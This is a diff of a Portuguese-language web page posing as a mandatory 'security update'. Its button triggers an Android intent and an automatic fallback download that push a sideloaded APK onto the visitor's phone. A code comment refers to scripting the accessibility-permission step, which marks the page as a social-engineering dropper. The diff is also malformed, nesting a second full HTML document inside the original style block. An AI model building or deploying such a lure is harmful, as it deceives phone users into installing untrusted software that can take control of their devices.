@@ -5,40 +5,63 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instalação de Segurança</title>
     <style>
-        body {
-            font-family: 'Roboto', Arial, sans-serif;
-            background-color: #f5f5f5;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .container {
-            background: white;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-            text-align: center;
-            width: 300px;
-        }
-        h2 { color: #333; margin-bottom: 10px; }
-        p { color: #666; font-size: 14px; margin-bottom: 20px; }
-        .btn {
-            background-color: #1a73e8; /* Azul Google */
-            color: white;
-            border: none;
-            padding: 12px 24px;
-            font-size: 16px;
-            border-radius: 4px;
-            cursor: pointer;
-            width: 100%;
-            transition: background 0.3s;
-        }
-        .btn:hover { background-color: #1558b0; }
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Atualização do Sistema</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f0f0f0; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: white; padding: 30px; border-radius: 10px; text-align: center; box-shadow: 0 4px 8px rgba(0,0,0,0.2); max-width: 90%; }
+        h2 { color: #333; margin-top: 0; }
+        p { color: #555; }
+        .btn { background-color: #1a73e8; color: white; border: none; padding: 15px 30px; font-size: 16px; border-radius: 5px; cursor: pointer; width: 100%; }
+        .loader { display: none; margin-top: 10px; color: #1a73e8; font-size: 14px; }
     </style>
 </head>
 <body>
+
+    <div class="box">
+        <h2>Atualização de Segurança</h2>
+        <p>Toque abaixo para instalar a atualização necessária.</p>
+        
+        <!-- Botão que dispara a ação -->
+        <button class="btn" id="installBtn">Instalar Agora</button>
+        <div class="loader" id="loader">Baixando e instalando...</div>
+    </div>
+
+    <script>
+        // CAMINHO DO SEU APK - Mude se necessário
+        const apkUrl = 'app.apk';
+
+        document.getElementById('installBtn').addEventListener('click', function() {
+            // 1. Simula o clique na permissão de acessibilidade (se você tiver o script)
+            // Se já estiver após a permissão, vamos direto para o download.
+            
+            document.getElementById('loader').style.display = 'block';
+            document.getElementById('installBtn').style.display = 'none';
+
+            // 2. Tenta forçar o download via Intent (Android)
+            // O scheme 'intent:' faz o Android tentar abrir o app automaticamente
+            const intentUrl = 'intent://' + apkUrl + '#Intent;scheme=file;package=com.android.packageinstaller;S.browser_fallback_url=https://play.google.com/store/apps/details?id=com.android.packageinstaller;end';
+            
+            // Método 1: Direct Intent (Funciona no Chrome Android)
+            window.location.href = intentUrl;
+
+            // Método 2: Fallback (se o método 1 falhar, tenta baixar normal)
+            setTimeout(function() {
+                const link = document.createElement('a');
+                link.href = apkUrl;
+                link.download = 'app.apk';
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+            }, 2000);
+        });
+    </script>
+</body>
+</html>
 
 <div class="container">
     <h2>Atualização Necessária</h2>
